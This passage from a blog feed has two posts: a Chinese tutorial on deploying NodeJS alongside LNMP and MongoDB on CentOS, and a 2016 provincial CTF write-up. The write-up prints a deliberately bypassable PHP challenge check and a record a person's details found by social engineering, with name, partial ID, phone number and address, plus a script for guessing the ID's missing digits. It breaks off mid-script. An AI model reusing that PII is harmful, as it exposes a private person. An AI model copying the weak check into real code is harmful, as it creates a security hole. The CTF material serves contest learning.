    <content type="html"><![CDATA[<blockquote><p>需求： 之前使用 <code>PHP+Mysql</code> 做开发，近年来<code>NodeJS</code>有点火，且不需要<code>Apache</code>、<code>Nginx</code>、<code>Tomcat</code>做容器，想在不影响之前<code>PHP</code>开发环境下，也能体验<code>NodeJS+Mysql</code>玩法。国内搜索了很多也没有发现有关<code>LNMP+Nodejs</code>的具体部署教程，于是踩了很多坑，终于配出了<strong>NodeJS+LNMP+PHPMyAdmin</strong></p></blockquote><h2 id="一、购买服务器"><a href="#一、购买服务器" class="headerlink" title="一、购买服务器"></a>一、购买服务器</h2><h4 id="1-选择服务器配置"><a href="#1-选择服务器配置" class="headerlink" title="1.选择服务器配置"></a>1.选择服务器配置</h4><p>因为NodeJS<strong>异步</strong>、<strong>非阻塞</strong>的特性，所以<strong>多核CPU</strong>对NodeJS算比较浪费吧，所以主要提高内存的大小，所以选了<strong>腾讯云1核、2G 内存</strong>的服务器。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/55884377.jpg" alt=""></p><h4 id="2-选择镜像"><a href="#2-选择镜像" class="headerlink" title="2.选择镜像"></a>2.选择镜像</h4><blockquote><p>这个比较重要，镜像要是选得好，配置起来各种高效率。这里我推荐的系统是<strong>CentOS 7+</strong>  (主要是因为CentOS 6使用的是Python 2.6，<strong>yum</strong>各种坑，想升级成Python 2.7坑还多)。</p></blockquote><p>镜像选择 <strong>PHP运行环境（CentOS7.1 64位 Nginx | PHP多版本）</strong>，<strong>腾讯云</strong>里的服务提供商<strong>上海微柳</strong>这家提供的<code>oneinstack</code> 太强大了，工具和文档都很详细，并且和其它的镜像不一样的是，<code>ssh</code>连接时，会有暗红高亮，相当好用。然后直接买、买、买就行了（较其它主机提供商，腾讯云的学生机相当给力）。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/19776864.jpg" alt=""></p><p>然后就配好了，访问服务器80端口，下载镜像的文档(超级方便的各种脚本)：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/80203594.jpg" alt=""></p><h2 id="二、基本配置"><a href="#二、基本配置" class="headerlink" title="二、基本配置"></a>二、基本配置</h2><blockquote><p>注意：有些服务器需要在腾讯云的控制台上设置安全组，不然22端口将无法开放，就会导致才买的服务器通过<code>ssh</code>连不上。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/53347020-file_1487151858921_15c5a.png" alt=""></p><p>首先开启FTP，方便传文件：</p><h4 id="1-开启FTP服务器"><a href="#1-开启FTP服务器" class="headerlink" title="1.开启FTP服务器"></a>1.开启FTP服务器</h4><p><code>service pureftpd start</code>开启，这样就可以配置FTP了。  首先进入<code>oneinstack</code>目录 -&gt; 运行<code>./pureftpd_vhost.sh</code> -&gt; 添加一个FTP用户</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/72972548.jpg" alt=""></p><h4 id="2-更改Mysql密码"><a href="#2-更改Mysql密码" class="headerlink" title="2.更改Mysql密码"></a>2.更改Mysql密码</h4><p><code>oneinstack</code>目录下，运行 <code>./reset_db_root_password.sh</code>，输入数据库密码。<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/68090101.jpg" alt=""></p><h2 id="三、配置NodeJS"><a href="#三、配置NodeJS" class="headerlink" title="三、配置NodeJS"></a>三、配置NodeJS</h2><h4 id="1-yum更新"><a href="#1-yum更新" class="headerlink" title="1.yum更新"></a>1.yum更新</h4><p>主要的目的是为了当npm安装比较”娇气”的模块时不报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y update</span><br><span class="line">$ yum -y install zlib-devel curl-devel openssl-devel perl cpio expat-devel gettext-devel openssl zlib autoconf tk perl-ExtUtils-MakeMaker gcc make gcc-c++ openssl-devel wget</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/12134840.jpg" alt=""></p><h4 id="2-安装NodeJS"><a href="#2-安装NodeJS" class="headerlink" title="2.安装NodeJS"></a>2.安装<code>NodeJS</code></h4><p>这里采用<code>nvm</code>来安装<code>nodejs</code>，是因为<code>nvm</code>对<code>nodejs</code>进行版本管理，这就方便多了，比如我<code>Ghost</code>博客的<code>Node</code>版本只能是<code>0.10.x || 0.12.0</code>。而一般用的，是<code>4.x.x</code>了。所以非常有必要。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/creationix/nvm.git ~/.nvm</span><br><span class="line">$ <span class="built_in">source</span> ~/.nvm/nvm.sh</span><br><span class="line">$ vi ~/.bashrc 或者 ~/.profile 或者 ~/.zshrc`</span><br><span class="line">$ nvm install node版本号</span><br></pre></td></tr></table></figure><p>这样的话，下次ssh上去时，才不会发现<code>nvm</code>未安装。<br>参考<a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm的Usage</a></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-5/30105026.jpg" alt=""></p><blockquote><p>安装完 node 后，安装一下 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> ，用于更换 <code>npm</code> 源，加快模块安装速度。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 安装nrm</span><br><span class="line">$ npm install -g nrm</span><br><span class="line">// 查看下有哪些好用的源</span><br><span class="line">$ nrm ls</span><br><span class="line">// 切换cnpm源</span><br><span class="line">$ nrm use cnpm</span><br></pre></td></tr></table></figure><h4 id="3-安装forever模块，永久运行node"><a href="#3-安装forever模块，永久运行node" class="headerlink" title="3.安装forever模块，永久运行node"></a>3.安装forever模块，永久运行node</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g forever</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-5/60815964.jpg" alt=""></p><h2 id="四、配置Ngnix"><a href="#四、配置Ngnix" class="headerlink" title="四、配置Ngnix"></a>四、配置Ngnix</h2><h4 id="1-虚拟主机的配置"><a href="#1-虚拟主机的配置" class="headerlink" title="1.虚拟主机的配置"></a>1.虚拟主机的配置</h4><p>新建后，会在产生2个重要文件(以我的域名test.ycjcl.cc为例)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">虚拟主机的配置文件(到时候运行nodejs时，需要更改成反向代理):             /usr/local/nginx/conf/vhost/test.ycjcl.cc.conf</span><br><span class="line">项目目录(node项目，可以通过ftp传上去):                 /data/wwwroot/test.ycjcl.cc</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-4/56277679.jpg" alt=""></p><h4 id="2-防火墙设置"><a href="#2-防火墙设置" class="headerlink" title="2.防火墙设置"></a>2.防火墙设置</h4><p>这里我生成了一个<code>express</code>项目，端口为3000，但是并不能访问到3000端口</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-5/6929252.jpg" alt=""></p><p>需要防火墙忽略3000端口，所以执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 允许 3000 端口</span><br><span class="line">$ iptables -I INPUT 4 -p tcp -m state --state NEW -m tcp --dport 3000 -j ACCEPT</span><br><span class="line">// 保存 iptables 规则</span><br><span class="line">$ service iptables save</span><br></pre></td></tr></table></figure><p>就可以ip+端口访问了：</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-5/9495109.jpg" alt=""></p><h4 id="3-将node服务和域名进行绑定"><a href="#3-将node服务和域名进行绑定" class="headerlink" title="3.将node服务和域名进行绑定"></a>3.将node服务和域名进行绑定</h4><p>修改配置：<strong>(中间的location都删了，直接加这个)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vi /usr/<span class="built_in">local</span>/nginx/conf/vhost/test.ycjcl.cc.conf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">location /</span><br><span class="line">&#123;</span><br><span class="line">    proxy_redirect off;</span><br><span class="line">    proxy_set_header   X-Real-IP            <span class="variable">$remote_addr</span>;</span><br><span class="line">    proxy_set_header   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    proxy_set_header   Host                   <span class="variable">$http_host</span>;</span><br><span class="line">    proxy_set_header   X-NginX-Proxy    <span class="literal">true</span>;</span><br><span class="line">    proxy_set_header   Connection <span class="string">""</span>;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_pass        http://127.0.0.1:3000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启nginx ,<code>service nginx restart</code></p><p>然后用域名访问成功，！！！</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-11-5/58499048.jpg" alt=""></p><p>需要 phpMyAdmin,直接用 <code>ip/phpMyAdmin</code>，可以进行mysql的管理。</p><h2 id="五、安装Mongodb-可选"><a href="#五、安装Mongodb-可选" class="headerlink" title="五、安装Mongodb(可选)"></a>五、安装Mongodb(可选)</h2><h4 id="1-首先将mongodb源添加到yum中。vim-etc-yum-repos-d-mongodb-repo编辑添加以下内容："><a href="#1-首先将mongodb源添加到yum中。vim-etc-yum-repos-d-mongodb-repo编辑添加以下内容：" class="headerlink" title="1.首先将mongodb源添加到yum中。vim /etc/yum.repos.d/mongodb.repo编辑添加以下内容："></a>1.首先将mongodb源添加到yum中。<code>vim /etc/yum.repos.d/mongodb.repo</code>编辑添加以下内容：</h4><p><strong>如果是64位CentOS 7系统</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mongodb]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-31/76029784.jpg" alt=""></p><p><strong>如果是32位系统</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mongodb]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/i686/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h6 id="2-先更新yum，然后安装mongodb"><a href="#2-先更新yum，然后安装mongodb" class="headerlink" title="2.先更新yum，然后安装mongodb"></a>2.先更新yum，然后安装mongodb</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 更新</span><br><span class="line">$ yum -y update</span><br><span class="line">// 安装mongodb</span><br><span class="line">$ yum -y install mongodb-org mongodb-org-server</span><br></pre></td></tr></table></figure><h6 id="3-运行mongodb-默认27017端口"><a href="#3-运行mongodb-默认27017端口" class="headerlink" title="3.运行mongodb(默认27017端口)"></a>3.运行mongodb(默认27017端口)</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl &#123;start|status|stop&#125; mongod</span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-8-31/35405771.jpg" alt=""></p><blockquote><p>注意：从MongoDB“赎金事件”中，建议一定要使用<code>db.addUser</code>和<code>db.changeUserPassword</code>更改用户名和密码。</p></blockquote><h2 id="六、常见问题"><a href="#六、常见问题" class="headerlink" title="六、常见问题"></a>六、常见问题</h2><blockquote><p>如果重装系统，ssh上去时，出现以下错误，用<code>ssh-keygen -R IP地址</code> 来解决</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-7-22/68866015.jpg" alt=""></p><blockquote><p>有时候开启node服务时，提示某个端口被占用。此时要用命令查看端口<code>fuser -n tcp 端口号</code>，或查看服务<code>ps -ef | grep 服务名</code>，kill掉<code>kill -9 pID进程号</code>。如果大型访问量时，优雅软重启的使用<code>kill -HUP pID进程号</code>。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-2-15/83014875-file_1487151517505_2138.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;需求： 之前使用 &lt;code&gt;PHP+Mysql&lt;/code&gt; 做开发，近年来&lt;code&gt;NodeJS&lt;/code&gt;有点火，且不需要&lt;code&gt;Apache&lt;/code&gt;、&lt;code&gt;Nginx&lt;/code&gt;、&lt;code&gt;Tomcat&lt;/code&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2016第二届陕西省网络空间安全大赛WriteUp</title>
    <link href="https://www.ycjcl.cc/2018/07/08/2016%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteUp/"/>
    <id>https://www.ycjcl.cc/2018/07/08/2016第二届陕西省网络空间安全大赛WriteUp/</id>
    <published>2018-07-07T17:11:57.000Z</published>
    <updated>2018-07-07T17:12:17.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/88204668.jpg" alt=""></p><p>#####2016年5月27号(比赛前夜)<br>比赛前一天晚上，入驻<code>陕西电子商务酒店</code>。进行签到，发比赛服装(真心不好看，最后也没穿过)<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/31523174.jpg" alt=""><br>还没开始比赛，酒店里都开打起来了，wifi都被玩坏，最后连本地的DNS都被篡改了。（我为了防止<code>中间人</code>，拿下一个路由器，在管理界面开了<code>AP隔离</code>）<br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/45933516.jpg" alt=""><br><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/74528206.jpg" alt=""><br>然后在酒店里，看了会电影就早早休息了。</p><p>#####2016年5月28号(正式比赛)<br>有选择题和实践题，俩队员在弄选择题时，我去拿了<code>web1</code>的一血。</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/62433167.jpg" alt=""></h2><p>######0x01 web<br>是一道代码审计题，发包，返回了源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view-source'</span>])) &#123;</span><br><span class="line">  header(<span class="string">'Location: http://challenge1.xa.honyasec.com/index.php'</span>);</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'hihi'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_POST[<span class="string">'hihi'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("have fun:)")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen($_POST[<span class="string">'hihi'</span>]) &lt; <span class="number">11</span> &amp;&amp; $_POST[<span class="string">'hihi'</span>] &gt; <span class="number">999999999</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos($_POST[<span class="string">'hihi'</span>], <span class="string">'#HONG#'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($_POST[<span class="string">'hihi'</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Congratulations! FLAG is : "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("nonono")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("sorry")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">"?view-source"</span>&gt;view-source&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>根据正则表达式，构造绕过拿到<code>flag</code>:</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/1501704.jpg" alt=""></p><p>######0x02 web<br>web2是一道综合题，先是<code>password</code>注入，队员用<code>sqlmap</code>跑出来密码为空，用不了。最后发现是文件包含，但是一直没绕过。赛后问出题人，就这个题要先用<code>action</code>参数到根目录，然后再文件包含该目录下的文件。</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-5-29/20436834.jpg" alt=""></p><p>######0x03 xxx(题目太多，记得不清)<br>一道社工题，flag就是该人的身份证号。队员社工到：<code>杜伟M 14010619841****812 2011-11-15 11:37:3313663513074山西省太原市迎泽区朝阳街1号5楼3  ***</code>然后，只有四位，写个脚本判断身份证是否正确：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#Errors=['验证通过!','身份证号码位数不对!','身份证号码出生日期超出范围或含有非法字符!','身份证号码校验错误!','身份证地区非法!']</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkIdcard</span><span class="params">(idcard)</span>:</span></span><br><span class="line">    Errors=[<span class="string">'验证通过!'</span>,<span class="string">'身份证号码位数不对!'</span>,<span class="string">'身份证号码出生日期超出范围或含有非法字符!'</span>,<span class="string">'身份证号码校验错误!'</span>,<span class="string">'身份证地区非法!'</span>]</span><br><span class="line">    area=&#123;<span class="string">"11"</span>:<span class="string">"北京"</span>,<span class="string">"12"</span>:<span class="string">"天津"</span>,<span class="string">"13"</span>:<span class="string">"河北"</span>,<span class="string">"14"</span>:<span class="string">"山西"</span>,<span class="string">"15"</span>:<span class="string">"内蒙古"</span>,<span class="string">"21"</span>:<span class="string">"辽宁"</span>,<span class="string">"22"</span>:<span class="string">"吉林"</span>,<span class="string">"23"</span>:<span class="string">"黑龙江"</span>,<span class="string">"31"</span>:<span class="string">"上海"</span>,<span class="string">"32"</span>:<span class="string">"江苏"</span>,<span class="string">"33"</span>:<span class="string">"浙江"</span>,<span class="string">"34"</span>:<span class="string">"安徽"</span>,<span class="string">"35"</span>:<span class="string">"福建"</span>,<span class="string">"36"</span>:<span class="string">"江西"</span>,<span class="string">"37"</span>:<span class="string">"山东"</span>,<span class="string">"41"</span>:<span class="string">"河南"</span>,<span class="string">"42"</span>:<span class="string">"湖北"</span>,<span class="string">"43"</span>:<span class="string">"湖南"</span>,<span class="string">"44"</span>:<span class="string">"广东"</span>,<span class="string">"45"</span>:<span class="string">"广西"</span>,<span class="string">"46"</span>:<span class="string">"海南"</span>,<span class="string">"50"</span>:<span class="string">"重庆"</span>,<span class="string">"51"</span>:<span class="string">"四川"</span>,<span class="string">"52"</span>:<span class="string">"贵州"</span>,<span class="string">"53"</span>:<span class="string">"云南"</span>,<span class="string">"54"</span>:<span class="string">"西藏"</span>,<span class="string">"61"</span>:<span class="string">"陕西"</span>,<span class="string">"62"</span>:<span class="string">"甘肃"</span>,<span class="string">"63"</span>:<span class="string">"青海"</span>,<span class="string">"64"</span>:<span class="string">"宁夏"</span>,<span class="string">"65"</span>:<span class="string">"新疆"</span>,<span class="string">"71"</span>:<span class="string">"台湾"</span>,<span class="string">"81"</span>:<span class="string">"香港"</span>,<span class="string">"82"</span>:<span class="string">"澳门"</span>,<span class="string">"91"</span>:<span class="string">"国外"</span>&#125;</span><br><span class="line">    idcard=idcard.strip()</span><br><span class="line">    idcard_list=list(idcard)</span><br><span class="line">    <span class="comment">#地区校验</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> area[(idcard)[<span class="number">0</span>:<span class="number">2</span>]]):</span><br><span class="line">        <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">4</span>]</span><br><span class="line">    <span class="comment">#15位身份号码检测</span></span><br><span class="line">    <span class="keyword">if</span>(len(idcard)==<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span>((int(idcard[<span class="number">6</span>:<span class="number">8</span>])+<span class="number">1900</span>) % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">or</span>((int(idcard[<span class="number">6</span>:<span class="number">8</span>])+<span class="number">1900</span>) % <span class="number">100</span> == <span class="number">0</span> <span class="keyword">and</span> (int(idcard[<span class="number">6</span>:<span class="number">8</span>])+<span class="number">1900</span>) % <span class="number">4</span> == <span class="number">0</span> )):</span><br><span class="line">            erg=re.compile(<span class="string">'[1-9][0-9]&#123;5&#125;[0-9]&#123;2&#125;((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))[0-9]&#123;3&#125;$'</span>)<span class="comment">#//测试出生日期的合法性</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ereg=re.compile(<span class="string">'[1-9][0-9]&#123;5&#125;[0-9]&#123;2&#125;((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))[0-9]&#123;3&#125;$'</span>)<span class="comment">#//测试出生日期的合法性</span></span><br><span class="line">        <span class="keyword">if</span>(re.match(ereg,idcard)):</span><br><span class="line">            <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#18位身份号码检测</span></span><br><span class="line">    <span class="keyword">elif</span>(len(idcard)==<span class="number">18</span>):</span><br><span class="line">        <span class="comment">#出生日期的合法性检查</span></span><br><span class="line">        <span class="comment">#闰年月日:((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))</span></span><br><span class="line">        <span class="comment">#平年月日:((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))</span></span><br><span class="line">        <span class="keyword">if</span>(int(idcard[<span class="number">6</span>:<span class="number">10</span>]) % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">or</span> (int(idcard[<span class="number">6</span>:<span class="number">10</span>]) % <span class="number">100</span> == <span class="number">0</span> <span class="keyword">and</span> int(idcard[<span class="number">6</span>:<span class="number">10</span>])%<span class="number">4</span> == <span class="number">0</span> )):</span><br><span class="line">            ereg=re.compile(<span class="string">'[1-9][0-9]&#123;5&#125;19[0-9]&#123;2&#125;((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|[1-2][0-9]))[0-9]&#123;3&#125;[0-9Xx]$'</span>)<span class="comment">#//闰年出生日期的合法性正则表达式</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ereg=re.compile(<span class="string">'[1-9][0-9]&#123;5&#125;19[0-9]&#123;2&#125;((01|03|05|07|08|10|12)(0[1-9]|[1-2][0-9]|3[0-1])|(04|06|09|11)(0[1-9]|[1-2][0-9]|30)|02(0[1-9]|1[0-9]|2[0-8]))[0-9]&#123;3&#125;[0-9Xx]$'</span>)<span class="comment">#//平年出生日期的合法性正则表达式</span></span><br><span class="line">        <span class="comment">#//测试出生日期的合法性</span></span><br><span class="line">        <span class="keyword">if</span>(re.match(ereg,idcard)):</span><br><span class="line">            <span class="comment">#//计算校验位</span></span><br><span class="line">            S = (int(idcard_list[<span class="number">0</span>]) + int(idcard_list[<span class="number">10</span>])) * <span class="number">7</span> + (int(idcard_list[<span class="number">1</span>]) + int(idcard_list[<span class="number">11</span>])) * <span class="number">9</span> + (int(idcard_list[<span class="number">2</span>]) + int(idcard_list[<span class="number">12</span>])) * <span class="number">10</span> + (int(idcard_list[<span class="number">3</span>]) + int(idcard_list[<span class="number">13</span>])) * <span class="number">5</span> + (int(idcard_list[<span class="number">4</span>]) + int(idcard_list[<span class="number">14</span>])) * <span class="number">8</span> + (int(idcard_list[<span class="number">5</span>]) + int(idcard_list[<span class="number">15</span>])) * <span class="number">4</span> + (int(idcard_list[<span class="number">6</span>]) + int(idcard_list[<span class="number">16</span>])) * <span class="number">2</span> + int(idcard_list[<span class="number">7</span>]) * <span class="number">1</span> + int(idcard_list[<span class="number">8</span>]) * <span class="number">6</span> + int(idcard_list[<span class="number">9</span>]) * <span class="number">3</span></span><br><span class="line">            Y = S % <span class="number">11</span></span><br><span class="line">            M = <span class="string">"F"</span></span><br><span class="line">            JYM = <span class="string">"10X98765432"</span></span><br><span class="line">            M = JYM[Y]<span class="comment">#判断校验位</span></span><br><span class="line">            <span class="keyword">if</span>(M == idcard_list[<span class="number">17</span>]):<span class="comment">#检测ID的校验位</span></span><br><span class="line">                <span class="keyword">print</span> idcard+<span class="string">" "</span>+Errors[<span class="number">0</span>]</span><br><span class="line">            <span 